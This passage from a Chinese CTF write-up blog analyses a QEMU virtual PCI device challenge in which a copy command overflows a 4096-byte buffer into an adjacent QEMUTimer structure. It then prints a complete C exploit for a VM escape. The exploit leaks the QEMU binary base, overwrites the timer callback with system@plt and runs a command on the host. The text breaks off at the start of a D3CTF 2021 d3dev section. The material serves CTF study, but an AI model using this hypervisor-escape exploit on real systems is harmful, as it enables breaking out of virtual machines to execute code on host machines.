class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以看到<code>read</code>函数的功能是分别获取<code>cp_list_src</code>、<code>cp_list_cnt</code>、<code>cmd</code>的值，而<code>write</code>函数则是设置这<code>3</code>个参数，其中在设置<code>cmd</code>这个参数时还会调用<code>timer_mod</code>函数。我们把重点放在<code>fastcp_cp_timer</code>函数中。可以看到该函数会按照<code>cmd</code>的值的不同进行不同的操作。当<code>cmd</code>的值为<code>1</code>时，我们重点看下面这段代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v9 = <span class="number">3</span> * v8++;</span><br><span class="line">cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="number">8</span> * v9, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>我们首先来看看<code>cpu_physical_memory_rw</code>函数。该函数的原型大概如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cpu_physical_memory_rw</span><span class="params">(hwaddr addr,</span></span><br><span class="line"><span class="params">                            <span class="type">void</span> *buf,</span></span><br><span class="line"><span class="params">                            hwaddr len,</span></span><br><span class="line"><span class="params">                            <span class="type">bool</span> is_write)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>hwaddr addr</code>：要读取或写入的物理内存地址。</li>
<li><code>void *buf</code>：指向数据缓冲区的指针，该缓冲区包含要写入内存的数据（在写入操作时），或用于接收从内存中读取的数据（在读取操作时）。</li>
<li><code>hwaddr len</code>：要读取或写入的数据长度。</li>
<li><code>bool is_write</code>：指示操作是读取<code>（false）</code>还是写入<code>（true）</code>。</li>
</ul>
<p>可以看到程序会遍历<code>CP_list_src</code>并将其数据复制<code>0x18</code>字节到<code>cp_info</code>，然后从<code>cp_info.CP_src</code>复制c<code>p_info.CP_cnt</code>字节的数据到<code>opaque-&gt;CP_buffer</code>，最后从<code>opaque-&gt;CP_buffer</code>复制<code>cp_info.CP_cnt</code>字节数据到<code>cp_info.CP_dst</code>中，即从<code>cp_info.CP_src</code>复制<code>cp_info.CP_cnt</code>字节的数据到<code>cp_info.CP_dst</code>中。我们可以想到，当<code>CP_cnt</code>足够大时是不是可以造成溢出呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00000000 FastCPState struc ; (sizeof=0x1A30, align=0x10, copyof_4530)</span><br><span class="line">00000000 pdev PCIDevice_0 ?</span><br><span class="line">000008F0 mmio MemoryRegion_0 ?</span><br><span class="line">000009E0 cp_state CP_state ?</span><br><span class="line">000009F8 handling db ?</span><br><span class="line">000009F9 db ? ; undefined</span><br><span class="line">000009FA db ? ; undefined</span><br><span class="line">000009FB db ? ; undefined</span><br><span class="line">000009FC irq_status dd ?</span><br><span class="line">00000A00 CP_buffer db 4096 dup(?)</span><br><span class="line">00001A00 cp_timer QEMUTimer_0 ?</span><br><span class="line">00001A30 FastCPState ends</span><br></pre></td></tr></table></figure>
<p>我们可以看到，<code>CP_buffer</code>变量只有<code>0x1000</code>字节，当<code>CP_cnt</code>足够大时，我们就可以对<code>cp_timer</code>结构体进行读写操作。我们再来看看<code>cp_timer</code>结构体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000 QEMUTimer_0 struc ; (sizeof=0x30, align=0x8, copyof_1181)</span><br><span class="line">00000000                                         ; XREF: FastCPState/r</span><br><span class="line">00000000 expire_time dq ?</span><br><span class="line">00000008 timer_list dq ?                         ; offset</span><br><span class="line">00000010 cb dq ?                                 ; offset</span><br><span class="line">00000018 opaque dq ?                             ; offset</span><br><span class="line">00000020 next dq ?                               ; offset</span><br><span class="line">00000028 attributes dd ?</span><br><span class="line">0000002C scale dd ?</span><br><span class="line">00000030 QEMUTimer_0 ends</span><br></pre></td></tr></table></figure>
<p>我们可以看到我们熟悉的<code>cb</code>指针和<code>opaque</code>指针。我们可以利用溢出来读取地址然后通过溢出来修改<code>cb</code>指针为<code>system</code>的<code>plt</code>表，<code>opaque</code>指向函数参数即可完成逃逸<br>这里提一下<code>WJH</code>师傅说的要注意的点：所有在设备中的操作地址都是指 <code>QEMU</code> 模拟的物理地址，但是程序中使用 <code>mmap</code> 申请的是虚拟地址空间。所以要注意使用 <code>mmap</code> 申请出来的超过一页的部分，在物理空间上不连续。如果需要操作那块空间，需要使用那一页的虚拟地址重新计算对应的物理地址<br>原理懂了后，由于很烂的<code>C</code>语言水平，还是写不出<code>exp</code>脚本，以下为参考<code>WJH</code>师傅的<code>exp</code>所编写</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_MAP_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">hash_map_entry</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> key, value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hash_map_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; hash_map_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">hash_map</span> &#123;</span></span><br><span class="line">    hash_map_entry **entry;</span><br><span class="line">&#125; hash_map;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">hash_map_get</span><span class="params">(hash_map *<span class="built_in">map</span>, <span class="type">uint64_t</span> key)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> hash = key &amp; HASH_MAP_SIZE;</span><br><span class="line">    <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[hash]; entry; entry = entry-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;key == key) &#123;</span><br><span class="line">            <span class="keyword">return</span> entry-&gt;value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hash_map_set</span><span class="params">(hash_map *<span class="built_in">map</span>, <span class="type">uint64_t</span> key, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> hash = key &amp; HASH_MAP_SIZE;</span><br><span class="line">    <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[hash]; entry; entry = entry-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;key == key) &#123;</span><br><span class="line">            entry-&gt;value = value;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    hash_map_entry *entry = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(hash_map_entry));</span><br><span class="line">    entry-&gt;next = <span class="built_in">map</span>-&gt;entry[hash];</span><br><span class="line">    entry-&gt;key = key;</span><br><span class="line">    entry-&gt;value = value;</span><br><span class="line">    <span class="built_in">map</span>-&gt;entry[hash] = entry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hash_map_del</span><span class="params">(hash_map *<span class="built_in">map</span>, <span class="type">uint64_t</span> key)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> hash = key &amp; HASH_MAP_SIZE;</span><br><span class="line">    <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[hash], *prev = <span class="literal">NULL</span>; entry; prev = entry, entry = entry-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;key == key) &#123;</span><br><span class="line">            prev == <span class="literal">NULL</span> ? (<span class="built_in">map</span>-&gt;entry[hash] = entry-&gt;next) : (prev-&gt;next = entry-&gt;next);</span><br><span class="line">            <span class="built_in">free</span>(entry);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hash_map_init</span><span class="params">(hash_map *<span class="built_in">map</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">map</span>-&gt;entry = <span class="built_in">calloc</span>(HASH_MAP_SIZE, <span class="keyword">sizeof</span>(hash_map_entry *));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hash_map_clear</span><span class="params">(hash_map *<span class="built_in">map</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HASH_MAP_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[i], *next; entry; entry = next) &#123;</span><br><span class="line">            next = entry-&gt;next, <span class="built_in">free</span>(entry);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">map</span>-&gt;entry);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">vaddr_to_paddr</span><span class="params">(<span class="type">size_t</span> vaddr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> pagemap_fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    lseek(pagemap_fd, vaddr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET);</span><br><span class="line">    <span class="type">size_t</span> data;</span><br><span class="line">    assert(read(pagemap_fd, &amp;data, <span class="number">8</span>) == <span class="number">8</span>);</span><br><span class="line">    close(pagemap_fd);</span><br><span class="line">    <span class="keyword">return</span> data * PAGE_SIZE + (vaddr % PAGE_SIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *vaddr[<span class="number">2</span>];</span><br><span class="line">    <span class="type">size_t</span> paddr;</span><br><span class="line">&#125; adjacent_pages_buf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">release_pages</span><span class="params">(hash_map *<span class="built_in">map</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[i]; entry; entry = entry-&gt;next) &#123;</span><br><span class="line">            assert(munmap((<span class="type">void</span> *) entry-&gt;value, PAGE_SIZE) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    hash_map_clear(<span class="built_in">map</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_adjacent_pages</span><span class="params">(adjacent_pages_buf *buf)</span> &#123;</span><br><span class="line">    hash_map *<span class="built_in">map</span> = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(hash_map *));</span><br><span class="line">    hash_map_init(<span class="built_in">map</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">size_t</span> vaddr = (<span class="type">size_t</span>) (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memset</span>((<span class="type">void</span> *) vaddr, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line">        <span class="type">size_t</span> paddr = vaddr_to_paddr(vaddr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] new page %p %p\n&quot;</span>, paddr, vaddr);</span><br><span class="line">        <span class="keyword">if</span> ((buf-&gt;vaddr[<span class="number">1</span>] = (<span class="type">void</span> *) hash_map_get(<span class="built_in">map</span>, paddr + <span class="number">0x1000</span>)) != (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">            buf-&gt;vaddr[<span class="number">0</span>] = (<span class="type">void</span> *) vaddr;</span><br><span class="line">            buf-&gt;paddr = paddr;</span><br><span class="line">            hash_map_del(<span class="built_in">map</span>, paddr + <span class="number">0x1000</span>);</span><br><span class="line">            release_pages(<span class="built_in">map</span>), <span class="built_in">free</span>(<span class="built_in">map</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((buf-&gt;vaddr[<span class="number">0</span>] = (<span class="type">void</span> *) hash_map_get(<span class="built_in">map</span>, paddr - <span class="number">0x1000</span>)) != (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">            buf-&gt;vaddr[<span class="number">1</span>] = (<span class="type">void</span> *) vaddr;</span><br><span class="line">            buf-&gt;paddr = paddr - <span class="number">0x1000</span>;</span><br><span class="line">            hash_map_del(<span class="built_in">map</span>, paddr - <span class="number">0x1000</span>);</span><br><span class="line">            hash_map_clear(<span class="built_in">map</span>), <span class="built_in">free</span>(<span class="built_in">map</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hash_map_set(<span class="built_in">map</span>, paddr, vaddr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">size_t</span> offset, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *) (mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">size_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *) (mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SRC 0x8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CNT 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD 0x18</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> CP_src;</span><br><span class="line">    <span class="type">size_t</span> CP_cnt;</span><br><span class="line">    <span class="type">size_t</span> CP_dst;</span><br><span class="line">&#125; CP_info;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> cmd[] = <span class="string">&quot;wslview calc.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mlock(mmio_mem, <span class="number">0x1000</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mlock mmio_mem.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    adjacent_pages_buf read_buf;</span><br><span class="line">    get_adjacent_pages(&amp;read_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] read_buf vaddr[0]: %p\n&quot;</span>, read_buf.vaddr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] read_buf vaddr[1]: %p\n&quot;</span>, read_buf.vaddr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] read_buf paddr: %p\n&quot;</span>, read_buf.paddr);</span><br><span class="line"></span><br><span class="line">    adjacent_pages_buf write_buf;</span><br><span class="line">    get_adjacent_pages(&amp;write_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] write_buf vaddr[0]: %p\n&quot;</span>, write_buf.vaddr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] write_buf vaddr[1]: %p\n&quot;</span>, write_buf.vaddr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] write_buf paddr: %p\n&quot;</span>, write_buf.paddr);</span><br><span class="line"></span><br><span class="line">    (*(CP_info *) write_buf.vaddr[<span class="number">0</span>]).CP_dst = read_buf.paddr;</span><br><span class="line">    (*(CP_info *) write_buf.vaddr[<span class="number">0</span>]).CP_cnt = <span class="number">0x1040</span>;</span><br><span class="line">    mmio_write(SRC, write_buf.paddr);</span><br><span class="line">    mmio_write(CNT, <span class="number">1</span>);</span><br><span class="line">    mmio_write(CMD, <span class="number">0x4</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> timer_list_addr = ((<span class="type">size_t</span> *) read_buf.vaddr[<span class="number">1</span>])[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> elf_base = ((<span class="type">size_t</span> *) read_buf.vaddr[<span class="number">1</span>])[<span class="number">2</span>] - <span class="number">0x4dce80</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] elf base: %p\n&quot;</span>, elf_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> system_plt = elf_base + <span class="number">0x2c2180</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] system@plt: %p\n&quot;</span>, system_plt);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> opaque_addr = ((<span class="type">size_t</span> *) read_buf.vaddr[<span class="number">1</span>])[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] opaque addr: %p\n&quot;</span>, opaque_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x11</span>; i++) &#123;</span><br><span class="line">        (*(CP_info *) (write_buf.vaddr[<span class="number">0</span>] + i * <span class="keyword">sizeof</span>(CP_info))).CP_src = write_buf.paddr;</span><br><span class="line">        (*(CP_info *) (write_buf.vaddr[<span class="number">0</span>] + i * <span class="keyword">sizeof</span>(CP_info))).CP_dst = read_buf.paddr;</span><br><span class="line">        (*(CP_info *) (write_buf.vaddr[<span class="number">0</span>] + i * <span class="keyword">sizeof</span>(CP_info))).CP_cnt = <span class="number">0x1020</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) (write_buf.vaddr[<span class="number">1</span>] + <span class="number">0x8</span>) = timer_list_addr;</span><br><span class="line">    *(<span class="type">size_t</span> *) (write_buf.vaddr[<span class="number">1</span>] + <span class="number">0x10</span>) = system_plt;</span><br><span class="line">    *(<span class="type">size_t</span> *) (write_buf.vaddr[<span class="number">1</span>] + <span class="number">0x18</span>) = opaque_addr + <span class="number">0xa00</span> + <span class="number">0x500</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span> *) (write_buf.vaddr[<span class="number">0</span>] + <span class="number">0x500</span>), cmd, <span class="keyword">sizeof</span>(cmd));</span><br><span class="line">    mmio_write(SRC, write_buf.paddr);</span><br><span class="line">    mmio_write(CNT, <span class="number">0x11</span>);</span><br><span class="line">    mmio_write(CMD, <span class="number">0x1</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    mmio_write(CMD, <span class="number">0x114514</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="D3CTF-2021-d3dev"><a href="#D3CTF-2021-d3dev" class="headerlink" title="[D3CTF 2021] d3dev"></a>[D3CTF 2021] d3dev</h2><h3 id="关键函数-1"><a href="#关键函数-1" class="headerlink" title="关键函数"></a>关键函数</h3><h4 id="d3dev-mmio-read"><a href="#d3dev-mmio-read" class="headerlink" title="d3dev_mmio_read"></a>d3dev_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">d3dev_mmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;blocks[opaque-&gt;seek + (<span 